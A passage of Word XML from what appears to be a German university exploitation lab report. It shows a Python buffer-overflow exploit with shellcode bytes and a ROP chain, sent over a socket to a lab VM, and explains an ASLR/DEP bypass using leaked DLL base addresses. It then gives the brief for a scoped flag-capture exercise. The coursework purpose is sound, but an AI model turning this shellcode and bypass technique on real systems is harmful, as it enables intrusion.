              <w:t xml:space="preserve">    calculator = b'\x31\xd2\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xf0\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41D5F9E0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="48DFEB4E" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = a + b + c + calculator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5152DC83" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    connect = s.connect(('10.0.2.12', 4444))  # hardcoded IP address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72E26ADF" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="732AF2AE" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(bytes('C \r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51ACFF36" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74C79A26" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(buffer + bytes('\r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28719459" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2854ED94" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(bytes('y\r\n', 'utf-8'))  # evil buffer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D2B1909" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>s.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="596C590B" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4D002405" w14:textId="2CA0CE9E" w:rsidR="00327CE2" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>main()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005E3899" w:rsidRPr="00C105E5" w14:paraId="49CF68CC" w14:textId="77777777" w:rsidTr="00327CE2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="729E9BE4" w14:textId="0A1421DA" w:rsidR="005E3899" w:rsidRPr="004D58C1" w:rsidRDefault="00C105E5" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C105E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>poc_board_release_aslr_dep.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="407E29A9" w14:textId="77777777" w:rsidR="00EE4772" w:rsidRPr="00C105E5" w:rsidRDefault="00EE4772" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F27B2D3" w14:textId="3B11C15C" w:rsidR="00D43B43" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Wie bereits im ersten Abschnitt der Aufgabe beschrieben </w:t>
      </w:r>
      <w:r w:rsidR="003B059F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">übergibt mir die Funktion getAslrBase() die aktuellen Base Adressen der DLLs. Die Methode wird in der Main aufgerufen und </w:t>
      </w:r>
      <w:r w:rsidR="006764F6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">speichert das Ergebnis in die Variablen </w:t>
      </w:r>
      <w:r w:rsidR="00A53905" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">base_ucrtbase_DLL1, base_WS2_32_dll1 und base_kernel32_dll1. Anschließend </w:t>
      </w:r>
      <w:r w:rsidR="00D007C9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">werden die Ergebnisse in einen </w:t>
      </w:r>
      <w:r w:rsidR="009C65DE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">hex Integer umgewandelt und der </w:t>
      </w:r>
      <w:r w:rsidR="00D43B43" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ROP Chain </w:t>
      </w:r>
      <w:r w:rsidR="009C65DE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Funktion übergeben.</w:t>
      </w:r>
      <w:r w:rsidR="00D43B43" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die ROP Chain wird </w:t>
      </w:r>
      <w:r w:rsidR="00E9161A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">so an den Buffer angehängt, dass die </w:t>
      </w:r>
      <w:r w:rsidR="00857E0F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">erste Adresse direkt auf das EIP </w:t>
      </w:r>
      <w:r w:rsidR="00F73D2B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>gesetzt wird</w:t>
      </w:r>
      <w:r w:rsidR="0058043A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Die ROP Chain ersetzt also das JUMP Esp aus Aufgabe 2</w:t>
      </w:r>
      <w:r w:rsidR="007F546C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="0058043A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00356E42" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anschließend wird der generierte Calculator </w:t>
      </w:r>
      <w:r w:rsidR="00E622AF" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Code auf den Buffer gesetzt. Dieser sieht schlussendlich so aus:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51060C22" w14:textId="700C45DF" w:rsidR="00E622AF" w:rsidRPr="00B47CB9" w:rsidRDefault="00E622AF" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C426A0" w:rsidRPr="00866A18" w14:paraId="79991943" w14:textId="77777777" w:rsidTr="00C426A0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65AEF099" w14:textId="77777777" w:rsidR="00C426A0" w:rsidRPr="004D58C1" w:rsidRDefault="00C426A0" w:rsidP="00C426A0">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    a = b'\x41' * 36</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03511A1E" w14:textId="77777777" w:rsidR="00C426A0" w:rsidRPr="004D58C1" w:rsidRDefault="00C426A0" w:rsidP="00C426A0">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    b = b'\x42' * 4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5963A007" w14:textId="77777777" w:rsidR="00C426A0" w:rsidRPr="004D58C1" w:rsidRDefault="00C426A0" w:rsidP="00C426A0">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    c = rop_chain</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DFF100C" w14:textId="77777777" w:rsidR="00C426A0" w:rsidRPr="004D58C1" w:rsidRDefault="00C426A0" w:rsidP="00C426A0">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    calculator = b'\x31\xd2\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xf0\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D179599" w14:textId="77777777" w:rsidR="00C426A0" w:rsidRPr="004D58C1" w:rsidRDefault="00C426A0" w:rsidP="00C426A0">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3B1A436A" w14:textId="2CD2BE03" w:rsidR="00C426A0" w:rsidRPr="004D58C1" w:rsidRDefault="00C426A0" w:rsidP="00C426A0">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = a + b + c + calculator</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="21E16DD4" w14:textId="60ED1EC9" w:rsidR="00E622AF" w:rsidRPr="004D58C1" w:rsidRDefault="00E622AF" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03C2F02C" w14:textId="4595F827" w:rsidR="00C426A0" w:rsidRPr="00B47CB9" w:rsidRDefault="00C426A0" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nachdem </w:t>
      </w:r>
      <w:r w:rsidR="00C82315" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">der Exploit gestartet wurde </w:t>
      </w:r>
      <w:r w:rsidR="008E21ED" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>der Rechner erscheint auf de</w:t>
      </w:r>
      <w:r w:rsidR="001B3D1A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>r virtuellen Maschine, auf welcher die Anwendung läuft.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255DBDB9" w14:textId="1844159C" w:rsidR="001B3D1A" w:rsidRPr="00B47CB9" w:rsidRDefault="001B3D1A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06FDCC61" w14:textId="42DFB359" w:rsidR="001B3D1A" w:rsidRPr="00B47CB9" w:rsidRDefault="001B3D1A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1AF04543" wp14:editId="17382874">
            <wp:extent cx="5759450" cy="2813050"/>
            <wp:effectExtent l="0" t="0" r="0" b="635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59450" cy="2813050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0B805A" w14:textId="77777777" w:rsidR="00C426A0" w:rsidRPr="00B47CB9" w:rsidRDefault="00C426A0" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1532B380" w14:textId="0FCED165" w:rsidR="00806874" w:rsidRPr="00B47CB9" w:rsidRDefault="001B3D1A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Um sicher zu </w:t>
      </w:r>
      <w:r w:rsidR="0037293F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>gehen,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000F64CD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dass ASLR funk</w:t>
      </w:r>
      <w:r w:rsidR="001447F7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>tioniert wurde die Maschine neugestartet und der Versuch erneut durchgeführt</w:t>
      </w:r>
      <w:r w:rsidR="007A2541" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>. Wie in der folgenden Abbildung ersichtlich</w:t>
      </w:r>
      <w:r w:rsidR="00310AA0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> öffnet sich erneut der Rechner mit anderen Base Adressen als Ausgabe </w:t>
      </w:r>
      <w:r w:rsidR="005303ED" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>in der Konsole der Kali Maschine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DF2D31" w14:textId="03D59F53" w:rsidR="007A2541" w:rsidRPr="00B47CB9" w:rsidRDefault="007A2541" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="354DE38F" w14:textId="728EC9CB" w:rsidR="007A2541" w:rsidRPr="00B47CB9" w:rsidRDefault="007A2541" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6AE074B1" wp14:editId="248EEE31">
            <wp:extent cx="5759450" cy="2818765"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>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59450" cy="2818765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C85C4FC" w14:textId="52E2BB6E" w:rsidR="001447F7" w:rsidRPr="00B47CB9" w:rsidRDefault="001447F7" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F3D5A87" w14:textId="77777777" w:rsidR="001447F7" w:rsidRPr="00B47CB9" w:rsidRDefault="001447F7" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AECA948" w14:textId="2E83A756" w:rsidR="000F6B3B" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95" w:rsidP="00D12C95">
      <w:pPr>
        <w:pStyle w:val="berschrift1"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc62994620"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Aufgabe 4 (8P)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="20B672D4" w14:textId="0CE4DE78" w:rsidR="00D12C95" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="433750CC" w14:textId="47DA50AD" w:rsidR="00D12C95" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95" w:rsidP="00D12C95">
      <w:pPr>
        <w:pStyle w:val="berschrift2"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc62994621"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Angabe</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="1D55D6C4" w14:textId="011CCF7C" w:rsidR="00B63054" w:rsidRPr="00B47CB9" w:rsidRDefault="00B63054" w:rsidP="00B63054">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="495076F4" w14:textId="3D53BB89" w:rsidR="00B63054" w:rsidRPr="00B47CB9" w:rsidRDefault="00B63054" w:rsidP="00B63054">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Sie staunten nicht schlecht als plötzlich zwei Männer in Anzügen in Ihrem Büro standen, sich als Vertreter einer Regierungsbehörde auswiesen und Sie um Hilfe baten! Ersten Ermittlungen zufolge nutzt die erfolgreiche APT Gruppe „No Regerts“ die auch für den Angriff auf Ihren Kunden verantwortlich gemacht wird, ein gehacktes Service im Netz um Zugriffspassworte auf einen hochverschlüsselten IRQ Chat auszutauschen. Die darauf angesetzten Spezialisten konnten die verwendete Software inklusive des Sourcecodes recherchieren, darüber hinaus hat man durch Scans und Fingerprinting die Version des Linux Servers erfahren. Alle Versuche das Service selbst zu hacken scheiterten bislang. Nun wendet man sich hilfesuchen an Sie und hofft, dass Sie Ihrem Ruf gerecht werden und das IRQ Chat Passwort liefern können. Als Sie einwilligen, den Auftrag anzunehmen überreicht man Ihnen einen USB Stick mit den bereits recherchierten Informationen und gibt Ihnen die IP Adresse der Service 10.105.21.174:8080 Neugierig und ein wenig geehrt fühlend beginnen Sie das Service zu analysieren. Anmerkung: Das Service ist im FH Netz, verbinden Sie sich mit VPN. Als Credentials für das Service selbst verwenden Sie beim Login Ihren TW Account sowohl als Login als auch als Password, getrennt durch einen Doppelpunkt. D.h. Eingabe beim Login: zum Beispiel ic16m001:ic16m01 Der Scope ist die Beschaffung des Flags. Alle Aktivitäten, die über diesen Scope hinausgehen z.B. Angriffe auf andere Rechner oder Veränderung bzw. mutwillige Beschädigung des Systems werden nicht geduldet! Volle Punkteanzahl, wenn Sie ASLR ohne Bruteforce bypassen können, ansonsten nur die halbe!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38314A45" w14:textId="0BB74DC9" w:rsidR="00D12C95" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A053A9" w14:textId="67D6C06B" w:rsidR="00D12C95" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95" w:rsidP="004D017F">
      <w:pPr>
        <w:pStyle w:val="berschrift2"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc62994622"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Lösung</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="34A0C687" w14:textId="16ECF3F9" w:rsidR="00D12C95" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95" w:rsidP="00D12C95">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B586383" w14:textId="75014833" w:rsidR="00D12C95" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95" w:rsidP="00D12C95">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Es wurde als erstes versucht das </w:t>
      </w:r>
      <w:r w:rsidR="006F7E18" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>pokerRop.c File zu kompilieren. Dabei bekam ich die Meldung, dass die Da</w:t>
      </w:r>
      <w:r w:rsidR="00540AE8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>tei libinetsec.h fehlt. Diese wurde mit „touch</w:t>
      </w:r>
      <w:r w:rsidR="00AB3911" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">“ generiert. Daraufhin wurde versucht die Datei erneut zu kompilieren. </w:t>
      </w:r>
      <w:r w:rsidR="00B17DCA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anschließend </w:t>
      </w:r>
      <w:r w:rsidR="008E646D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wurde als Fehlermeldung ausgegeben, dass die Funktionen</w:t>
      </w:r>
      <w:r w:rsidR="00476766" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00234D06" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>init_canary</w:t>
      </w:r>
      <w:r w:rsidR="00807F7D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, check_</w:t>
      </w:r>
      <w:r w:rsidR="00476766" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>canary,</w:t>
      </w:r>
